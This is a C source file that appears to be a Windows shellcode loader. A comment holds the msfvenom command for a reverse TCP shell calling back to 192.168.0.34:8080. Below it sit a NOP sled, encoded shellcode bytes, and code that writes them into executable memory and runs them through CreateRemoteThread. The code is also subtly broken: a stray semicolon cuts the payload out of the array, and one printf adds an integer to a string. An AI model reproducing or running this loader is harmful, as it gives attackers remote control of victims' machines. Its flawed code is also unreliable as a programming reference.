//#include "<stdafx.h>"
#include "Windows.h"
#include "stdio.h"

int main()
{
	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.34  LPORT=8080 -f c 
	unsigned char my_shell[] =
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
		"\xb8\x44\xea\x30\x0e\xda\xc9\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
		"\x9a\x83\xc3\x04\x31\x43\x0f\x03\x43\x4b\x08\xc5\xf2\xbb\x43"
		"\x26\x0b\x3b\x3c\x16\xd9\x5f\x37\x0a\xed\x16\xa2\x20\x5f\x24"
		"\xa6\x65\x74\x3b\x0f\xc3\x52\xc8\x1d\xfc\xab\x31\xd0\x3c\x67"
		"\xf1\x72\xc1\x7a\x25\x55\xf8\xb4\x38\x94\x3d\x03\x37\x79\x93"
		"\x1f\xe5\x95\x43\xab\x4b\xaa\x6a\x7b\xc0\x92\x14\xfe\x16\x66"
		"\xa9\x01\x46\xd7\xba\x5a\x46\x53\xf4\x42\x87\xb0\x80\xba\xf3"
		"\x0a\xba\xc3\xb2\xf9\x88\xb0\x45\x28\xc1\x06\x84\x1b\x2f\x2b"
		"\x07\x63\x08\xd3\x72\x9f\x6a\x6e\x84\x64\x10\xb4\x01\x7b\xb2"
		"\x3f\xb1\x5f\x42\x93\x27\x2b\x48\x58\x2c\x73\x4d\x5f\xe1\x0f"
		"\x69\xd4\x04\xc0\xfb\xae\x22\xc4\xa0\x75\x4b\x5d\x0d\xdb\x74"
		"\xbd\xe9\x84\xd0\xb5\x18\xd2\x64\x36\xe3\xdb\x39\xa1\x72\x41"
		"\xb5\x31\xe3\xfe\x5c\x5c\x9a\x54\xf6\xec\x2b\x73\x01\x12\x06"
		"\x4a\xd6\xbf\xfa\xfe\xbb\x6c\x15\x3e\x3b\x93\xe5\x72\x54\xe9"
		"\x8c\xe0\xc6\x6c\x60\xcc\x38\x5f\x5e\x06\x13\xf6\xf0\x32\xf4"
		"\x7f\x7e\x9b\x44\xd4\xa0\xed\x76\xe5\x9b\x31\xd2\x77\xb5\x55"
		"\xbf\x19\x31\xb9\x08\xc8\x89\xfe\x56\x66\x9c\x3a\xa7\xb7\x4e"
		"\x0b\xee\x97\xe2\x02\x9b\xb2\xda\x93\x3e\x5e\x70\x73\xc0\xc8"
		"\xbc\xdd\xb9\xaf\x3e\x34\x6a\xe3\xaa\xb4\xdf\x50\x43\x2b\xc0"
		"\x56\x93\xa3\xc1\x57\x93\x33\x12\x6c\xf6\x64\x04\xd8\xb7\xe6"
		"\xa1\x81\x7f\xc0\x3a\x25\xcf\x1c\xfe\xda\xfc\x33\x84\x31\x74"
		"\x81\x02\x32\x4e\xd9\x83\x90\xcd\x6c\x29\x44\x27\xc8\xe2\x0f"
		"\x75\xa2\xaa\xfd\x18\x10\x1c\x60\x81\xd7\xd3\x22\x6f\x69\x51"
		"\x9e\xbd\xc5\x25\xd2\xbb\xb6\x86\x70\x6f\x5d\x25\x07\xbf\xfa"
		"\x57\xd7\x88\x6a\xf2\x72\xbf\x13\x84\x4c\x6f\x84\x3c\xce\xe1"
		"\x42\xf1\x65\x93\xe6\x6a\xec\x3f\xcf\x04\xc1\xf3\x1c\xad\x71"
		"\x40\x37\x07\x4b\x61\xde\xf6\x9f\xa3\x7a\xa9\xb8\xb0\x39\x11"
		"\x2b\x1a\xdb\xd1\x81\x08\x66\x72\x85\xb1\x27\x32\x3a\x00\xf2"
		"\xf2\xf6\x00\x45\x69\x53\x90\x3e\x58\x0a\x4d\x8e\xc7\xc8\xc6"
		"\x63\x5f\x7b\xdc\xb4\x19\x19\x52\xeb\xd5\xeb\x1c\x3d\x4c\x26"
		"\x91\x27\x03\x37\x12\xcc\x9c\xd4\xd0\x69\x51\x4a\x9c\x39\xf2"
		"\x1a\x53\xe2\x9a\xd1\x3d\x21\x2a\x5f\x92\x14\xc5\x1b\x53\xaf"
		"\x5d\xc0\x12\xbe\x65\x4d\xca\x40\xc5\x25\xa3\xc9\x7a\x73\xb4"
		"\x1f\x0d\xba\x18\xc8\x0d\x41\xf7\x8c\x5e\x16\x54\xda\x33\xce"
		"\x32\x0f\xe6\xc0\xf9\x30\xdd\x8b\x94\xc4\x82\xe0\x3b\x8a\x6f"
		"\x51\xd4\x01\x89\x45\x5f\xa5\x40\xf0\x5f\x2c\x7e\x93\xd7\xdc"
		"\x7e\x63\x80\xa6\x8e\x56\xb0\xd8\xbb\xd6\x45\xc6\xab\xa0\xa5"
		"\x08\x2b\x59\xe6\x60\x2b\x8d\xe6\x70\x43\xad\xe6\x30\x93\xfe"
		"\x8e\xe8\x37\x53\xaa\xf6\xe2\xc7\x67\x5a\x85\x0f\xd0\x34\x95"
		"\xef\xdf\xc4\xc6\xb9\xb7\xd6\x7e\xcc\xaa\x28\xab\x4a\xea\xa3"
		"\x9c\xde\xec\x4a\xe1\x64\x32\x39\x00\x3e\x70\x9d\x22\xc0\x89"
		"\xdd\x4d\x0e\x4f\x10\x9f\x40\x99\x6c\xf1\x92\xcb\xbf\x39\xd3"
		"\xa8\x30\xf4\x71\x98\xda\xf6\x26\xda\xce";
		





	HANDLE  processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 1, GetCurrentProcessId());
	if (processHandle == 0) {

		printf("error, unable to self process \n");
		int z = GetLastError();
		return 0;
	}

	// use VirtualAllocEx for remote process
	//	LPVOID  a  = (LPVOID) VirtualAllocEx(processHandle,NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID  a = (LPVOID)VirtualAlloc(0, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (a == 0) {
		//printf("error allcating memory\n");
		int b = GetLastError();
		return 0;
		//printf("Printing last error\n");
	}



	SIZE_T bytes = 0;
	SIZE_T* bytes_written = &bytes;

	//void *new_addr = memcpy(a, my_shell, 1024);	
	int result = WriteProcessMemory(
		processHandle,
		a,
		(LPCVOID)my_shell, //cast into pointer type acceptable to windows
		2048,  // trying dynamically
		bytes_written);
	if (result == 0) {
		printf("Couldn't write process memory (%d).\n", GetLastError());
		return 0;
	}

	DWORD thread_id;
	DWORD * test = &thread_id;

	HANDLE remoteThread_h = CreateRemoteThread(
		processHandle,
		NULL, //lpthreadattributes
		(SIZE_T) 1024, //dwstacksize
		(LPTHREAD_START_ROUTINE)a, //lpstartaddress
		NULL, //lpvoid lpparameter
		0,
		test);
	if (remoteThread_h == 0) {
		printf("Couldn't create remote thread.\n" + GetLastError());
		return 0;
	}
	printf("all good so far\n");
	printf("New thread id is %d.\n", thread_id);
	
	

	WaitForSingleObject(remoteThread_h, INFINITE);
	DWORD thread_error = GetThreadErrorMode();
	if (thread_error == NULL) {
		printf("No thread error code\n");
		return 0;
	}
	printf("Thread error mode is %d.\n", thread_error);
	return 1;
}